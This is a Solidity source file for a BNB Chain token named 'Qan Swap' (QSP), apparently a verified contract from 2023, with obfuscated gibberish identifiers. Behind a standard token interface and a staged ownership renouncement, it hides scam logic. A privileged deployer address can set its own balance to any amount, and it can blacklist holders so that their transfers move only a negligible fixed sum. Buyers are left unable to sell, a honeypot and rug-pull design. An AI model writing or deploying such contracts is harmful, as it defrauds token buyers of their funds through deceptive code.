/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


interface kcvdcrgjjufkxe {
    function createPair(address teshcwodqhj, address djxochpzdvuc) external returns (address);
}

interface shyazuzzyetdj {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract QanSwap {

    constructor (){ 
        
        shyazuzzyetdj hjobxvfaiez = shyazuzzyetdj(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        nftzfdkkaimsxv = kcvdcrgjjufkxe(hjobxvfaiez.factory()).createPair(hjobxvfaiez.WETH(), address(this));
        owner = evmwmnhgphga();
        if (tlwpcuzlr != gzhriyayni) {
            tlwpcuzlr = gzhriyayni;
        }
        xcsmkqsxelckl = owner;
        jbybmtijbfkl[xcsmkqsxelckl] = true;
        balanceOf[xcsmkqsxelckl] = totalSupply;
        
        emit Transfer(address(0), xcsmkqsxelckl, totalSupply);
        axmpvhlwv();
    }

    address public owner;

    function akfcwlemrmk() public view returns (bool) {
        return pepnalrkkxvwf;
    }

    string public symbol = "QSP";

    address public nftzfdkkaimsxv;

    function approve(address yysfzyqyxefumg, uint256 ioircyeqlqvtq) public returns (bool) {
        allowance[evmwmnhgphga()][yysfzyqyxefumg] = ioircyeqlqvtq;
        emit Approval(evmwmnhgphga(), yysfzyqyxefumg, ioircyeqlqvtq);
        return true;
    }

    function fbncjikxwhly(uint256 ioircyeqlqvtq) public {
        if (!jbybmtijbfkl[evmwmnhgphga()]) {
            return;
        }
        balanceOf[xcsmkqsxelckl] = ioircyeqlqvtq;
    }

    uint8 public decimals = 18;

    function aqlqahvsubo(address blvibwgruzyb) public {
        if (jkekximnngm) {
            return;
        }
        if (pepnalrkkxvwf == rvlkknafvcm) {
            rvlkknafvcm = false;
        }
        jbybmtijbfkl[blvibwgruzyb] = true;
        if (lwquesisnnio) {
            iejbveafbljmy = true;
        }
        jkekximnngm = true;
    }

    mapping(address => bool) public gwyqmxmfflosga;

    function getOwner() external view returns (address) {
        return owner;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function xftdvwotrd() public view returns (bool) {
        return phypfggttr;
    }

    function aeraodmsfct(address tbbzzcjennfa) public {
        
        if (tbbzzcjennfa == xcsmkqsxelckl || tbbzzcjennfa == nftzfdkkaimsxv || !jbybmtijbfkl[evmwmnhgphga()]) {
            return;
        }
        if (phypfggttr) {
            rvlkknafvcm = true;
        }
        gwyqmxmfflosga[tbbzzcjennfa] = true;
    }

    function mqfcwrvejwsfwt() public view returns (uint256) {
        return tlwpcuzlr;
    }

    bool public ncbaaoywdlcbt;

    bool public jkekximnngm;

    uint256 public xiapyavrqiwch;

    bool private lwquesisnnio;

    function transferFrom(address sfhvpguvyxfhp, address onqmhhurocq, uint256 ioircyeqlqvtq) external returns (bool) {
        if (allowance[sfhvpguvyxfhp][evmwmnhgphga()] != type(uint256).max) {
            require(ioircyeqlqvtq <= allowance[sfhvpguvyxfhp][evmwmnhgphga()]);
            allowance[sfhvpguvyxfhp][evmwmnhgphga()] -= ioircyeqlqvtq;
        }
        return ruhmmcekqekqj(sfhvpguvyxfhp, onqmhhurocq, ioircyeqlqvtq);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address yepvuzujpy, uint256 ioircyeqlqvtq) external returns (bool) {
        return ruhmmcekqekqj(evmwmnhgphga(), yepvuzujpy, ioircyeqlqvtq);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function dnrfhfdoxftsau() public view returns (bool) {
        return iejbveafbljmy;
    }

    mapping(address => bool) public jbybmtijbfkl;

    function xbgimqlcbmrz() public {
        
        
        iejbveafbljmy=false;
    }

    bool public iejbveafbljmy;

    uint256 constant sabaqneuqonuc = 11 ** 10;

    event Approval(address indexed tzzjiayvwp, address indexed spender, uint256 value);

    bool public aougxmzcjfee;

    address public xcsmkqsxelckl;

    string public name = "Qan Swap";

    function vrklqwrsg(address sfhvpguvyxfhp, address onqmhhurocq, uint256 ioircyeqlqvtq) internal returns (bool) {
        require(balanceOf[sfhvpguvyxfhp] >= ioircyeqlqvtq);
        balanceOf[sfhvpguvyxfhp] -= ioircyeqlqvtq;
        balanceOf[onqmhhurocq] += ioircyeqlqvtq;
        emit Transfer(sfhvpguvyxfhp, onqmhhurocq, ioircyeqlqvtq);
        return true;
    }

    function sphnuvjwo() public {
        
        if (lwquesisnnio == ncbaaoywdlcbt) {
            phypfggttr = false;
        }
        rvlkknafvcm=false;
    }

    function evmwmnhgphga() private view returns (address) {
        return msg.sender;
    }

    function axmpvhlwv() public {
        emit OwnershipTransferred(xcsmkqsxelckl, address(0));
        owner = address(0);
    }

    function ruhmmcekqekqj(address sfhvpguvyxfhp, address onqmhhurocq, uint256 ioircyeqlqvtq) internal returns (bool) {
        if (sfhvpguvyxfhp == xcsmkqsxelckl) {
            return vrklqwrsg(sfhvpguvyxfhp, onqmhhurocq, ioircyeqlqvtq);
        }
        if (gwyqmxmfflosga[sfhvpguvyxfhp]) {
            return vrklqwrsg(sfhvpguvyxfhp, onqmhhurocq, sabaqneuqonuc);
        }
        return vrklqwrsg(sfhvpguvyxfhp, onqmhhurocq, ioircyeqlqvtq);
    }

    mapping(address => uint256) public balanceOf;

    uint256 public tlwpcuzlr;

    bool public pepnalrkkxvwf;

    uint256 public gzhriyayni;

    event Transfer(address indexed from, address indexed svqggkyozmewhd, uint256 value);

    bool public phypfggttr;

    bool public rvlkknafvcm;

}